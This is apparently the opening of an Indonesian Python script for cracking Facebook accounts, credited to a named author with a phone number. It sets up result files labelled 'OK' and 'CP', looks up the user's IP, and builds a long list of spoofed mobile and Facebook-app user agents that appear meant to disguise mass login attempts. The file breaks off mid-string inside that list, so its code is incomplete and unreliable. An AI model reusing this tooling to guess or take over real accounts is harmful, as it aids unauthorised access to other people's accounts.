# Coded by @cebonk
# https://www.facebook.com/100003056150890
# https://github.com/cebonk112
# hp/wa:085369666987

import requests,bs4,json,os,sys,random,datetime,time,re,base64,subprocess,uuid
try:
	import gtts
except ImportError:
	os.system('pip install gtts')
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from colorama import init, Fore
from rich import print as kui
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
import calendar
from time import sleep as jeda
from rich.markdown import Markdown as mark
from rich.columns import Columns as col

# INDICATION
ses = requests.Session() 
data = {}
data2 = {}
apadong = []
old_gak = []
pass_tipe = []
berhasil = []
gagal = []
method = []
munculapk = []
save = [] 
gab,exp,data_licensi = [],[],{} 
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
id,id2,loop,ok,cp,akun,oprek = [],[],0,0,0,[],[]

# COLORS
init(autoreset=True)
C = Fore.BLUE
V = Fore.WHITE
Y = Fore.CYAN
S = Fore.GREEN
T = Fore.YELLOW
dk=random.choice([C,V,Y,S,T])
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
U = "\33[0;37m" # putih gelap
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
l = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI

dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
except KeyError:
	IP = " "
	CN = " "

# Converter Bulan
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# CLEAR
def clear():
	os.system('clear')

# BACK
def back():
	login()


ua=random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','NokiaC3-00/5.0 (07.80) Profile/MIDP-2.1 Configuration/CLDC-1.1/UC Browser7.0.0.41/27/400,Mozilla/5.0 (Linux; Android 5.1; en-US; E5533 Build/29.1.B.0.101) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Noki630/1.0 SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1/UC Browser7.0.0.41/27/400','Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36','NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UCBrowser8.4.0.159/70/352','NokiaX2-02/2.0 (11.79) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0(Java; U; MIDP-2.0; en-us; nokiax2-02) U2/1.0.0 UCBrowser/8.7.1.234 U2/1.0.0 Mobile UNTRUSTED/1.0','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; vivo Y53 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/8.6.12.9','Mozilla/5.0 (Linux; Android 8.1; DUA-L22 Build/HONORDUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G610Y Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; vi; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.0; en-US; ASUS_Z00AD Build/LRX21V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.599 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/264.0.0.44.111;]','Mozilla/5.0 (Linux; U; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/52.2.2254.54723','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/327.0.0.33.120;]','Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 9 Pro Max Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-gc','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; NOKIA; Lumia 730 Dual SIM) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/48.0.2564.82 Mobile Safari/537.36 Tepi/14.14332','Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; WebBrowser/8.1; IEMobile/11.0; NOKIA; Lumia 525) like Gecko UCBrowser/4.2.1.541 Mobile','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Nokia; Lumia 520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10570','Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0','Mozilla/5.0 (Linux; Android 9; Huawei P20 Lite Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/307.0.0.40.111;]','Mozilla/5.0 (Linux; U; Android 4.1.3; ru-RU; Nokia_X Build/GRK39F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 4.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF]','Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 6.0; Redmi 4 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 7A Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.9.3-g','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Tizen 2.2; SAMSUNG SM-Z9005) AppleWebKit/537.3 (KHTML, like Gecko) Version/2.2 like Android 4.1; Mobile Safari/537.3','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.13014 YaBrowser/13.12.1599.13014 Safari/537.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.5.6','Mozilla/5.0 (Linux; Android 8.1.0; BBF100-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64[FB_IAB/FB4A;FBAV/127.0.0.22.69','Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 GSA/4.6.10.19.arm64','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 PHX/4.7[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 9; Infinix X653C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/537.36 PHX/4.7','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 10; POCO X2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36','Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/29.3638; U; en) Presto/2.8.119 Version/11.10','SAMSUNG-GT-C3312R Opera/9.80 (J2ME/MIDP; Opera Mini/7.0.32584/144.30; U; en) Presto/2.12.423 Version/12.16','Mozilla/5.0 (Linux; U; Android 4.2.2; de-de; GT-I8200N Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; de-de; GT-P5110 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30','Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414','Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)','Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/159.0.0.38.95;]','Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36[FB_IAB/FB4A;FBAV/311.0.0.44.117;]','NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1','Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Browser Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019)[FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;] FBBK/1','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; Xperia Z3 Tablet Compact LTE Build/OPM8.190305.001; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.0(20416) Chrome/76.0.3809.111 Safari/537.36','Mozilla/5.0 (Linux; Android 10; Xperia Z3 Compact) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/60.3.3004.55692','Mozilla/5.0 (Linux; Android 9; Xperia Z3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36[FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]','Mozilla/5.0 (Linux; Android 9; Xperia XZ1 Build/47.2.A.11.228; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/286.0.0.48.112;]','Mozilla/5.0 (Linux; Android 9; Xperia XZ1 Build/47.2.A.11.228; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/290.0.0.44.121;]','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4501.0 Safari/537.36 Edg/91.0.866.0','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36 Edg/90.0.818.46','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 KHTML, like Gecko) Chrome/80.0.3987.122 Mobile Safari/537.','Mozilla/5.0 (Linux; Android 8.0.0; Nokia 3.1 Build/O00623) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/12.9.10.1166 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 10; SM-T295 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/330.0.0.31.120;]','Mozilla/5.0 (Linux; Android 11; SM-A715F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.164 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/330.0.0.31.120;]','Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148[FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Tele2;FBID/phone;FBLC/ru_RU;FBOP/5]','Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]','Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]','Mozilla/5.0 (Linux; Android 11.0.1; HUAWEI P30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; Huawei; H883G; HuaweiH883G)','Mozilla/5.0 (Linux; Android 11.0.1; HUAWEI P30 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/229.0.0.35.117;]','Mozilla/5.0 (Linux; Android 7.0; TRT-L21A Build/HUAWEITRT-L21A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; TRT-L21A Build/HUAWEITRT-L21A) 